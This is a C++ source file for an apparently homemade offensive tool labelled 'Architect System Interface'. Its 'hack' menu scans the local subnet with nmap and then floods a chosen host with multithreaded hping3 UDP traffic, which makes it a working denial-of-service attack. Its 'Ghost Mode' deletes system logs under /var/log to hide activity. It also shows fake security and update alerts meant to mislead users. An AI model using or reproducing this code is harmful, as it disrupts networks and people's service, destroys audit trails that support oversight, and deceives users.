#include <climits>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <cstdlib>
#include <thread>
#include <atomic>
#include <chrono>
#include <filesystem>
#include <memory>
#include <array>
#include <algorithm>
#include <unistd.h>
#include <signal.h>

namespace fs = std::filesystem;

// --- 1. KONSTANTA WARNA & SETTINGS ---
const std::string P = "\033[1;35m"; // Purple
const std::string B = "\033[1;34m"; // Blue
const std::string R = "\033[1;31m"; // Red
const std::string C = "\033[1;36m"; // Cyan
const std::string Y = "\033[1;33m"; // Yellow
const std::string W = "\033[1;37m"; // White
const std::string G = "\033[1;32m"; // Green
const std::string NC = "\033[0m";   // No Color

const std::string MASTER_ARCHITECT = "moses123";
std::string BASE_DIR;
std::string LAST_SCAN_FILE;
std::string SAFE_FILE;

// --- 2. ANTI-ROOT TRAP (SINKRON & PENIPUAN) ---
void architect_trap() {
    if (getuid() == 0) {
        std::system("clear");
        std::cout << R << "[!] CRITICAL_ERROR: KERNEL_INTEGRITY_COMPROMISED" << NC << std::endl;
        std::cout << Y << "{AI} Detection: SQL_Injection_Pattern matched in 'sudo' request." << NC << std::endl;
        std::cout << P << "{AI} Protocol: System-Wide Lockdown initiated to protect Database." << NC << std::endl;
        std::cout << "\n" << C << "[NOTICE] Standard Root Access is disabled for security." << std::endl;
        std::cout << "Please authenticate via 'Dev/Architect Mode' to regain control." << NC << std::endl;

        std::system("echo \"FATAL: Access restricted. Enter Dev/Architect Mode to prevent database corruption.\"");

        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::exit(1);
    }
}

// --- 3. HELPER UTILITY (Eksekusi Perintah Sistem) ---
std::string exec_command(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) return "";
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// --- 4. ANIMASI LOADING ---
void dynamic_loading(const std::string& text, std::atomic<bool>& stop_event) {
    std::vector<std::string> chars = {"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"};
    size_t i = 0;
    while (!stop_event.load()) {
        std::cout << "\r" << Y << "[" << chars[i % chars.size()] << "] " << text << "..." << NC << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        i++;
    }
    std::cout << "\r" << std::string(text.length() + 30, ' ') << "\r" << std::flush;
}

template<typename Func, typename... Args>
void run_with_loading(const std::string& text, Func target_func, Args&&... args) {
    std::atomic<bool> stop_event(false);
    std::thread t(dynamic_loading, text, std::ref(stop_event));
    target_func(std::forward<Args>(args)...);
    stop_event.store(true);
    if (t.joinable()) t.join();
}

void do_scan() {
    std::string gateway = exec_command("ip route | grep default | awk '{print $3}' | cut -d. -f1-3");
    gateway.erase(std::remove_if(gateway.begin(), gateway.end(), ::isspace), gateway.end());
    std::string target_range = (!gateway.empty()) ? gateway + ".0/24" : "192.168.1.0/24";
    std::string cmd = "nmap -sn --min-parallelism 100 " + target_range + " | grep 'Nmap scan report' | awk '{print $NF}' | tr -d '()' > " + LAST_SCAN_FILE;
    std::system(cmd.c_str());
}

bool is_in_safe_zone(const std::string& target) {
    if (fs::exists(SAFE_FILE)) {
        std::ifstream f(SAFE_FILE);
        std::string line;
        while (std::getline(f, line)) {
            if (line.find(target) != std::string::npos) return true;
        }
    }
    return false;
}

void flood_worker(std::string target, std::string size) {
    std::string cmd = "hping3 --udp --flood -d " + size + " " + target + " > /dev/null 2>&1";
    std::system(cmd.c_str());
}

void attack_executor(const std::string& t, const std::string& size, const std::string& label) {
    if (t.empty() || t == "None") return;
    if (is_in_safe_zone(t)) {
        std::cout << Y << "[!] " << t << " IS IN SAFE-ZONE. ABORTING." << NC << std::endl;
        return;
    }
    std::cout << R << "\n[!!!] " << label << " MODE ACTIVE -> " << t << NC << std::endl;
    int thread_count = (label == "MAXIMUM") ? 100 : 30;
    std::vector<std::thread> threads;
    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(std::thread(flood_worker, t, size));
    }
    std::cout << Y << "[*] Press Ctrl+C to stop the attack." << NC << std::endl;
    try {
        while (true) { std::this_thread::sleep_for(std::chrono::seconds(1)); }
    } catch (...) {}
}

void signal_handler(int signum) {
    std::system("pkill hping3");
    std::cout << "\n" << Y << "[*] OPERATION INTERRUPTED BY ARCHITECT." << NC << std::endl;
    std::exit(signum);
}

// --- BANNER ---
void print_banner() {
    std::cout << P << "             .----------.          .----------.\n"
              << "          ./            \\\\.      ./            \\\\.\n" << B
              << "         /                \\\\    /                \\\\\n"
              << "        /      " << R << ".----." << B << "      \\\\  /      " << R << ".----." << B << "      \\\\\n" << R
              << "       |      /  " << P << "目" << R << "   \\\\      | |      /  " << P << "目" << R << "   \\\\      |\n" << B
              << "        \\\\      '" << R << "----'" << B << "      /  \\\\      '" << R << "----'" << B << "      /\n"
              << "         \\\\                /    \\\\                /\n" << P
              << "          '\\.            /      '\\.            /\n"
              << "             '----------'          '----------'" << NC << std::endl;
    std::cout << Y << "           ARCHITECT SYSTEM INTERFACE - PUBLIC EDITION" << NC << std::endl;
    std::cout << C << "--------------------------------------------------------" << NC << std::endl;
}

// --- 6. MAIN CONTROLLER ---
int main(int argc, char* argv[]) {
    architect_trap();

    char result[PATH_MAX];
    ssize_t count = readlink("/proc/self/exe", result, PATH_MAX);
    std::string exe_path = std::string(result, (count > 0) ? count : 0);
    BASE_DIR = fs::path(exe_path).parent_path().string();
    LAST_SCAN_FILE = BASE_DIR + "/last_scan.txt";
    SAFE_FILE = BASE_DIR + "/whitelist.txt";

    signal(SIGINT, signal_handler);

    if (argc < 2) {
        print_banner();
        std::cout << W << "Usage:\n  blabla hack  : Open Exploitation & Pentest Menu\n  blabla task  : Open System Monitoring & Optimizations\n" << NC;
        return 0;
    }

    std::string arg = argv[1];

    // ================= FITUR 1: HACK MENU =================
    if (arg == "hack") {
        print_banner();
        std::cout << G << "[+] MAIN EXPLOIT MENU:" << NC << std::endl;
        std::cout << "  1. Network Scanner (Nmap Scan)" << std::endl;
        std::cout << "  2. Network Flooder (DDOS Simulator)" << std::endl;
        std::cout << "  3. Whitelist Zone (Safe-Zone Manager)" << std::endl;
        std::cout << "  4. Fake Core Update (Trick Script)" << std::endl;
        std::cout << "\n" << W << "Select Menu (1-4): " << NC;

        std::string menu_choice;
        std::cin >> menu_choice;

        if (menu_choice == "1") {
            run_with_loading("SCANNING NETWORK SECTOR", do_scan);
            std::cout << G << "[+] Scan Complete. Active targets saved." << NC << std::endl;
        }
        else if (menu_choice == "2") {
            std::vector<std::string> targets;
            if (fs::exists(LAST_SCAN_FILE)) {
                std::ifstream f(LAST_SCAN_FILE);
                std::string line;
                while (std::getline(f, line)) { if (!line.empty()) targets.push_back(line); }
            }
            if (targets.empty()) {
                std::cout << Y << "[!] No targets found. Please run Network Scanner (Menu 1) first." << NC << std::endl;
                return 0;
            }
            for (size_t i = 0; i < targets.size(); ++i) {
                std::cout << "  " << (i + 1) << ". " << targets[i] << std::endl;
            }
            std::cout << "\n" << W << "Select Target ID: " << NC;
            std::string t_id; 
            std::cin >> t_id;
            try {
                std::string target_ip = targets.at(std::stoi(t_id) - 1);
                std::cout << "\n" << Y << "[SELECT ATTACK MODE FOR " << target_ip << "]" << NC << std::endl;
                std::cout << "  1. SNIPER (1024 d)   2. STRIKE (4096 d)   3. MAXIMUM (65000 d)" << std::endl;
                std::cout << "\n" << W << "Action (1-3): " << NC;
                std::string mode; std::cin >> mode;
                if (mode == "1") attack_executor(target_ip, "1024", "SNIPER");
                else if (mode == "2") attack_executor(target_ip, "4096", "STRIKE");
                else if (mode == "3") attack_executor(target_ip, "65000", "MAXIMUM");
            } catch (...) { std::cout << R << "[!] Selection Error." << NC << std::endl; }
        }
        else if (menu_choice == "3") {
            std::cout << "\n" << C << "[SAFE ZONE MANAGER]" << NC << std::endl;
            std::cout << "  1. Add IP to Safe-Zone\n  2. Show Current Whitelist\n  3. Clear Safe-Zone" << std::endl;
            std::cout << "\n" << W << "Choice: " << NC;
            std::string sz_choice; std::cin >> sz_choice;
            if (sz_choice == "1") {
                std::cout << W << "Enter IP to Whitelist: " << NC;
                std::string ip; std::cin >> ip;
                std::ofstream f(SAFE_FILE, std::ios_base::app);
                f << ip << "\n";
                std::cout << G << "[+] " << ip << " added to Safe-Zone." << NC << std::endl;
            } else if (sz_choice == "2") {
                if (fs::exists(SAFE_FILE)) { std::system(("cat " + SAFE_FILE).c_str()); }
                else { std::cout << Y << "[!] Safe-Zone is empty." << NC << std::endl; }
            } else if (sz_choice == "3") {
                fs::remove(SAFE_FILE); std::cout << G << "[+] Safe-Zone Cleared." << NC << std::endl;
            }
        }
        else if (menu_choice == "4") {
            std::system("clear");
            for (int i = 1; i <= 100; ++i) {
                std::this_thread::sleep_for(std::chrono::milliseconds(40));
                std::cout << "\r" << B << "Updating Core Infrastructure... " << i << "%" << NC << std::flush;
            }
            std::cout << "\n" << R << "[!] Update Failed. System Integrity Compromised. Rolling back changes..." << NC << std::endl;
        }
    }

    // ================= FITUR 2: TASK MENU =================
    else if (arg == "task") {
        print_banner();
        std::cout << G << "[+] MAIN SYSTEM TASK MENU:" << NC << std::endl;
        std::cout << "  1. System Resource Overview (Uptime & Active Tasks)" << std::endl;
        std::cout << "  2. Purge RAM Cache (Memory Optimizer)" << std::endl;
        std::cout << "  3. Ghost Mode (Wipe System Logs /var/log)" << std::endl;
        std::cout << "  4. Network Ultra-Boost (Sysctl Optimization)" << std::endl;
        std::cout << "  5. Backup Tool (Compress Current Environment)" << std::endl;
        std::cout << "\n" << W << "Select Task (1-5): " << NC;

        std::string task_choice;
        std::cin >> task_choice;

        if (task_choice == "1") {
            std::cout << C << "\n--- System Uptime ---" << NC << std::endl;
            std::system("uptime -p");
            std::cout << C << "\n--- Top Resource Consuming Processes ---" << NC << std::endl;
            std::system("ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 10");
        }
        else if (task_choice == "2") {
            run_with_loading("PURGING RAM CACHE", []() {
                std::system("sync && sudo bash -c 'echo 3 > /proc/sys/vm/drop_caches' 2>/dev/null");
            });
            std::cout << G << "[+] Memory Optimization Complete." << NC << std::endl;
        }
        else if (task_choice == "3") {
            run_with_loading("WIPING LOGS (GHOST MODE)", []() {
                std::system("rm -rf /var/log/*.log 2>/dev/null");
            });
            std::cout << G << "[+] System Logs Cleaned. Ghost Mode Active." << NC << std::endl;
        }
        else if (task_choice == "4") {
            run_with_loading("APPLYING ULTRA NETWORK BOOST", []() {
                std::system("sysctl -w net.core.netdev_max_backlog=5000 > /dev/null 2>&1");
            });
            std::cout << G << "[+] Network Queue Optimized via sysctl." << NC << std::endl;
        }
        else if (task_choice == "5") {
            run_with_loading("CREATING SYSTEM STATE BACKUP", []() {
                std::string cmd = "tar -czf " + BASE_DIR + "/backup.tar.gz -C " + BASE_DIR + " . 2>/dev/null";
                std::system(cmd.c_str());
            });
            std::cout << G << "[+] Backup archive created at: " << BASE_DIR << "/backup.tar.gz" << NC << std::endl;
        }
    }
    else {
        std::cout << R << "[!] Unknown Protocol command. Use 'hack' or 'task'." << NC << std::endl;
    }

    return 0;
}
